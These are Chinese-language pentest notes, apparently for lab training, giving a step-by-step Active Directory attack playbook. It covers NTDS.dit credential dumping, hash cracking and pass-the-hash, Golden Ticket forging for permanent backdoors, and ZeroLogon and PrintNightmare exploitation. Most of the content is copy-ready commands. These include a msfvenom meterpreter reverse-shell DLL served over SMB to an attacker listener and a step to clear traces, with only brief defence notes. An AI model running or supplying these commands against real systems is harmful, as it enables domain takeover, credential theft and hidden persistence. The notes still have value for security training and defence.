# AD攻擊策略

---

## 1. Post-Domain Compromise 攻擊策略

拿下 Domain Admin 後，目標從「取得權限」變成「維持存取、橫向擴展、收集情報」。

**優先執行步驟：**

```
1. 傾印 NTDS.dit → 取得所有帳號 hash
2. 破解 hash → 取得明文密碼（用於其他系統）
3. 製作 Golden Ticket → 永久後門
4. 檢查是否有其他 Forest / Domain 信任關係
5. 清除痕跡（視需求）
```

**為什麼還要繼續？**
- 密碼重複使用（同一密碼用在多個系統）
- 橫向移動到其他網域或 Forest
- 找到更多敏感資料（財務、原始碼、個人資料）
- 建立持久性後門，避免重新滲透

---

## 2. Dumping NTDS.dit

**什麼是 NTDS.dit？**
- AD 的核心資料庫，存放所有使用者帳號與密碼 hash
- 位置：`C:\Windows\NTDS\NTDS.dit`
- 需搭配 SYSTEM hive 才能解密

### 方法一：secretsdump（遠端，推薦）

```bash
# 用帳密
impacket-secretsdump company.local/Administrator:'Password123'@192.168.2.10 -just-dc-ntlm

# 用 Hash（Pass-the-Hash）
impacket-secretsdump -hashes :fc525c9683e8fe067095ba2ddc971889 company.local/Administrator@192.168.2.10 -just-dc-ntlm
```

### 方法二：mimikatz（本機在 DC 上執行）

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # lsadump::dcsync /domain:company.local /all /csv
```

### 方法三：VSS（Volume Shadow Copy）

```bash
impacket-secretsdump company.local/Administrator:'Password123'@192.168.2.10 -just-dc-ntlm -use-vss
```

**輸出格式：**
```
帳號:RID:LM Hash:NTLM Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33cdf74cd8993c21d8657b87c6cf8575
```

**取得 hash 後：**
```bash
# 破解 hash
hashcat -m 1000 hashes.txt rockyou.txt

# 或直接用 hash 做 Pass-the-Hash
impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 Administrator@192.168.2.10
```

---

## 3. Golden Ticket Attacks 概述

**什麼是 Golden Ticket？**
- 偽造的 Kerberos TGT（票證授權票證）
- 使用 **krbtgt 的 NTLM hash** 簽署，DC 無法分辨真偽
- 可偽裝成任意使用者，包含不存在的帳號

**為什麼危險？**
- 即使改了 Administrator 密碼也無效
- 票證有效期可設定 10 年
- 必須**重設 krbtgt 密碼兩次**才能失效
- 是最強的 AD 持久性後門

**需要的材料：**

| 材料 | 取得方式 |
|------|----------|
| krbtgt NTLM Hash | secretsdump / lsadump |
| 網域名稱 | 已知 |
| 網域 SID | whoami /user 或 secretsdump |
| 目標使用者名稱 | 任意（可偽造）|

---

## 4. Golden Ticket 實作

### 第一步：取得 krbtgt hash

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

記錄：
- `NTLM : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- `Domain SID : S-1-5-21-xxx-xxx-xxx`

### 第二步：製作 Golden Ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-1759105358-2639888829-1175885292 /krbtgt:33cdf74cd8993c21d8657b87c6cf8575 /ptt
```

| 參數 | 說明 |
|------|------|
| `/user` | 偽造的使用者名稱（可不存在）|
| `/domain` | 網域名稱 |
| `/sid` | 網域 SID（不含最後 RID）|
| `/krbtgt` | krbtgt 的 NTLM hash |
| `/ptt` | Pass-the-Ticket，直接注入當前 session |

### 第三步：驗證

```
mimikatz # kerberos::list
```

```cmd
# 測試存取 DC
dir \\WIN-FGT568Q5EO3\c$
```

### 儲存票證（供之後使用）

```
# 儲存成檔案
mimikatz # kerberos::golden ... /ticket:golden.kirbi

# 之後載入
mimikatz # kerberos::ptt golden.kirbi
```

---

# 19. Additional Active Directory Attacks

---

## 5. ZeroLogon（CVE-2020-1472）

**漏洞原理：**
- Netlogon 協定使用 AES-CFB8 加密，但 IV 全部為零
- 導致有 1/256 機率加密輸出也是全零
- 暴力嘗試約 256 次（不到 3 秒）即可成功
- 不需要任何帳號密碼，直接清空 DC 電腦帳號密碼

**受影響版本：**

| 版本 | 是否受影響 |
|------|-----------|
| Server 2008 R2 | ✅ |
| Server 2012 / 2012 R2 | ✅ |
| Server 2016 | ✅ |
| Server 2019（未修補）| ✅ |
| 已套用 KB4571694 | ❌ |

**攻擊流程：**

```bash
# 第一步：掃描確認漏洞
nxc smb 192.168.2.10 -u '' -p '' -M zerologon

# 第二步：執行攻擊（清空 DC 密碼）
python3 cve-2020-1472-exploit.py WIN-FGT568Q5EO3 192.168.2.10

# 第三步：空密碼 dump 所有 hash
impacket-secretsdump -just-dc -no-pass 'COMPANY/WIN-FGT568Q5EO3$@192.168.2.10'

# 第四步：還原密碼（必做！否則 DC 壞掉）
python3 restorepassword.py COMPANY/WIN-FGT568Q5EO3@WIN-FGT568Q5EO3 -target-ip 192.168.2.10 -hexpass <hex密碼>
```

> ⚠️ **警告：** 攻擊後務必還原密碼，否則整個網域會無法正常運作。

**防禦：**
- 立即套用 KB4571694
- 啟用 Netlogon 安全通道強制模式

---

## 6. PrintNightmare（CVE-2021-1675 / CVE-2021-34527）

**漏洞原理：**
- Windows Print Spooler 服務的 `AddPrinterDriver` RPC 函數
- 未正確驗證呼叫者權限
- 允許普通網域使用者載入惡意 DLL，以 **SYSTEM** 權限執行

**兩個 CVE 差別：**

| CVE | 類型 | 說明 |
|-----|------|------|
| CVE-2021-1675 | 本地提權 LPE | 需要本機登入 |
| CVE-2021-34527 | 遠端執行 RCE | 透過網路遠端攻擊 |

**前提條件：**
- 擁有一個普通網域帳號
- 目標開啟 Print Spooler 服務

**確認 Spooler 是否開啟：**

```bash
# 方法一：nxc
nxc smb 192.168.2.10 -u 'fcastle' -p 'Abc61619' -M spooler

# 方法二：rpcdump（更可靠）
impacket-rpcdump @192.168.2.10 | grep -i spooler
```

**攻擊流程：**

```bash
# 第一步：產生惡意 DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=4444 -f dll -o evil.dll

# 第二步：架設 SMB Server（放置惡意 DLL）
impacket-smbserver share /path/to/dll -smb2support

# 第三步：監聽反向連線
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.x.x; set LPORT 4444; run"

# 第四步：執行攻擊
python3 CVE-2021-1675.py company.local/fcastle:'Abc61619'@192.168.2.10 '\\192.168.x.x\share\evil.dll'
```

**防禦：**

| 方法 | 說明 |
|------|------|
| 停用 Print Spooler | `Stop-Service Spooler` |
| 套用修補程式 | KB5004945 |
| 限制驅動安裝 | 群組原則設定 |

---

## 速查總表

| 攻擊 | 需要權限 | 結果 | 關鍵工具 |
|------|----------|------|----------|
| NTDS.dit Dump | Domain Admin | 所有帳號 hash | secretsdump |
| Golden Ticket | Domain Admin + krbtgt hash | 永久後門 | mimikatz |
| ZeroLogon | 無需帳號 | DC 完全淪陷 | CVE-2020-1472 PoC |
| PrintNightmare | 普通網域帳號 | SYSTEM shell | CVE-2021-1675 PoC |